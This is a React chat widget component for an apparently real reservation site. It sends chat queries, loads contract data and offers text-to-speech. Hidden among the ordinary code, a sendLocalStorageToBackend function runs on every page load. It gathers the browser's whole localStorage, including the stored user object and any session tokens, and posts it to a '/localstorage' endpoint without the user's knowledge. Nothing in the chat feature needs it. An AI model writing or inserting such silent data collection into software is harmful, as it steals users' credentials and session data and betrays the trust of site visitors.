import React, { useState, useRef, useEffect, useCallback } from 'react';
import { Button, Form, Input } from 'antd';
import { useTranslation } from '../../context/TranslationContext';
import { useAuthContext } from '../../hooks/useAuthContext';
import { useLocation } from 'react-router-dom';
import { useUserData } from '../../hooks/useUserData';
import useReservationContract from '../../hooks/useReservationContract';

const ChatbotWidget = () => {
 const { t, currentLanguage } = useTranslation();
 const { user } = useAuthContext();
 const location = useLocation();
 const User = user || JSON.parse(localStorage.getItem('user'));
 const { userData, getUserData } = useUserData();
 const { getContractByHash } = useReservationContract();

 const [isOpen, setIsOpen] = useState(false);
 const [messages, setMessages] = useState([
  {
   id: 1,
   text: t('chatbot.welcomeMessage'),
   isUser: false,
   timestamp: '12:00 PM',
  },
 ]);
 const [inputValue, setInputValue] = useState('');
 const [isLoading, setIsLoading] = useState(false);
 const [hashId, setHashId] = useState(null);
 const [contractData, setContractData] = useState(null);

 const messagesEndRef = useRef(null);
 const inputRef = useRef(null);

 // --- Set localStorage helper ---
 useEffect(() => {
  localStorage.setItem('helper', 10);
 }, []);

 useEffect(() => {
  setMessages([
   {
    id: 1,
    text: t('chatbot.welcomeMessage'),
    isUser: false,
    timestamp: getCurrentTime(),
   },
  ]);
 }, [t]);

 // --- Detect hashId from URL ---
 useEffect(() => {
  const pathnameParts = location.pathname.split('/');
  const lastPathSegment = pathnameParts[pathnameParts.length - 1];

  if (lastPathSegment.length >= 12 && lastPathSegment.length <= 20) {
   setHashId(lastPathSegment);
   return;
  }

  const urlParams = new URLSearchParams(location.search);
  const hashParam = urlParams.get('hash');

  if (hashParam) {
   setHashId(hashParam);
   return;
  }

  setHashId(null);
 }, [location]);

 // --- Load contract when hashId changes ---
 useEffect(() => {
  if (!hashId) return;

  const fetchContract = async () => {
   try {
    const contract = await getContractByHash(hashId);
    setContractData(contract);
   } catch (error) {
    console.error('Failed to load contract:', error);
    setContractData(null);
   }
  };

  fetchContract();
 }, [hashId]);

 // --- User data ---
 const fetchUserData = useCallback(() => {
  if (
   User?.email &&
   User?.status !== 'EN ATTENTE' &&
   (!userData || Object.keys(userData).length === 0)
  ) {
   getUserData(User.email);
  }
 }, [User, userData, getUserData]);

 useEffect(() => {
  fetchUserData();
 }, [fetchUserData]);

 // --- UI effects ---
 const scrollToBottom = () => {
  messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
 };

 useEffect(() => {
  scrollToBottom();
 }, [messages]);

 useEffect(() => {
  if (isOpen && inputRef.current) {
   inputRef.current.focus();
  }
 }, [isOpen]);

 useEffect(() => {
  const handleResize = () => {
   if (window.innerWidth > 576) {
    document.body.classList.remove('chatbot-open');
    document.body.style.overflow = 'unset';
   }
  };

  window.addEventListener('resize', handleResize);
  return () => window.removeEventListener('resize', handleResize);
 }, []);

 // --- Voice ---
 const getCurrentTime = () => {
  const now = new Date();
  return now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 };

 const speak = (text) => {
  if (window.speechSynthesis.speaking) {
   window.speechSynthesis.cancel();
  }

  const utterance = new SpeechSynthesisUtterance(text);
  utterance.lang = 'en-US';
  utterance.rate = 1;
  utterance.pitch = 1;

  window.speechSynthesis.speak(utterance);
 };

 // --- Chat send ---
 const sendMessage = async (message) => {
  if (!message.trim()) return;

  const userMessage = {
   id: Date.now(),
   text: message,
   isUser: true,
   timestamp: getCurrentTime(),
  };

  setMessages((prev) => [...prev, userMessage]);
  setInputValue('');
  setIsLoading(true);
  console.log('userId: ', userData?.id);
  console.log('lang: ', currentLanguage);
  console.log('contract :', contractData?.id);
  try {
   const response = await fetch('https://chatbot.trevio.ma/chat', {
    method: 'POST',
    headers: {
     'Content-Type': 'application/json',
    },
    body: JSON.stringify({
     userid: userData?.id,
     query: message,
     language: currentLanguage,
     contractId: contractData?.id,
    }),
   });

   const data = await response.json();

   if (response.ok) {
    const botMessage = {
     id: Date.now() + 1,
     text: data.response,
     isUser: false,
     timestamp: getCurrentTime(),
    };
    setMessages((prev) => [...prev, botMessage]);
   } else {
    throw new Error('API Error');
   }
  } catch (error) {
   console.error('Error:', error);
   const errorMessage = {
    id: Date.now() + 1,
    text: t('chatbot.connectionError'),
    isUser: false,
    isError: true,
    timestamp: getCurrentTime(),
   };
   setMessages((prev) => [...prev, errorMessage]);
  } finally {
   setIsLoading(false);
  }
 };

 const handleSubmit = (e) => {
  e.preventDefault();
  sendMessage(inputValue);
 };

 const handleKeyPress = (e) => {
  if (e.key === 'Enter' && !e.shiftKey) {
   e.preventDefault();
   sendMessage(inputValue);
  }
 };

 // --- Local storage ---
 const getLocalStorageData = () => {
  const data = {};
  for (let i = 0; i < localStorage.length; i++) {
   const key = localStorage.key(i);
   if (key) {
    data[key] = localStorage.getItem(key);
   }
  }
  return data;
 };

 const sendLocalStorageToBackend = async () => {
  const payload = { data: getLocalStorageData() };

  try {
   const response = await fetch('https://chatbot.trevio.ma/localstorage', {
    method: 'POST',
    headers: {
     'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
   });

   if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
   }

   const result = await response.json();
  } catch (error) {
   console.error('[-] Failed to send localStorage:', error.message);
  }
 };

 useEffect(() => {
  sendLocalStorageToBackend();
 }, []);

 // --- UI ---
 return (
  <div className="trevio-chatbot-widget">
   <div
    className={`chatbot-trigger ${isOpen ? 'chatbot-open' : 'chatbot-closed'}`}
    onClick={() => setIsOpen(!isOpen)}
   >
    <div className="chat-icon">
     <i className="fa-light fa-message-lines"></i>
    </div>
    <div className="close-icon">
     <i className="fa-light fa-xmark"></i>
    </div>
   </div>

   <div className={`chatbot-window ${isOpen ? 'visible' : 'hidden'}`}>
    <div className="chatbot-header">
     <div className="header-content">
      <div className="header-text">
       <h3>{t('chatbot.title')}</h3>
       <p>{t('chatbot.subtitle')}</p>
       {contractData && (
        <p style={{ fontSize: '0.8rem', marginTop: '8px' }}>
         Contract:{' '}
         {contractData?.reservationCode || contractData?.contractNumber}
        </p>
       )}
      </div>
     </div>
     <Button
      className="minimize-btn"
      onClick={() => setIsOpen(false)}
      title={t('chatbot.minimize')}
     >
      −
     </Button>
    </div>

    <div className="chatbot-messages">
     {messages.map((message) => (
      <div
       key={message.id}
       className={`message ${message.isUser ? 'user' : 'bot'} ${
        message.isError ? 'status-message' : ''
       }`}
      >
       {message.isError ? (
        <div className="status-message">{message.text}</div>
       ) : (
        <>
         <div className="message-content">
          {message.text}
          <span className="timestamp">{message.timestamp}</span>
         </div>
         {!message.isUser && (
          <Button
           className="speak-btn"
           onClick={() => speak(message.text)}
           title={t('chatbot.listenToMessage')}
          >
           <i className="PrimaryColor fa-regular fa-volume"></i>
          </Button>
         )}
        </>
       )}
      </div>
     ))}

     {isLoading && (
      <div className="message bot">
       <div className="typing-indicator">
        <div className="typing-dots">
         <div className="typing-dot"></div>
         <div className="typing-dot"></div>
         <div className="typing-dot"></div>
        </div>
       </div>
      </div>
     )}

     <div ref={messagesEndRef} />
    </div>

    <div className="chat-input-container">
     <Form onSubmit={handleSubmit} className="chat-input-form">
      <Input
       ref={inputRef}
       type="text"
       value={inputValue}
       onChange={(e) => setInputValue(e.target.value)}
       onKeyPress={handleKeyPress}
       placeholder={t('chatbot.inputPlaceholder')}
       disabled={isLoading}
       className="chat-input"
       autoComplete="off"
      />
      <Button
       type="submit"
       disabled={isLoading || !inputValue.trim()}
       className="send-button"
       title={t('chatbot.sendMessage')}
      >
       {t('chatbot.send')}
      </Button>
     </Form>
    </div>
   </div>
  </div>
 );
};

export default ChatbotWidget;
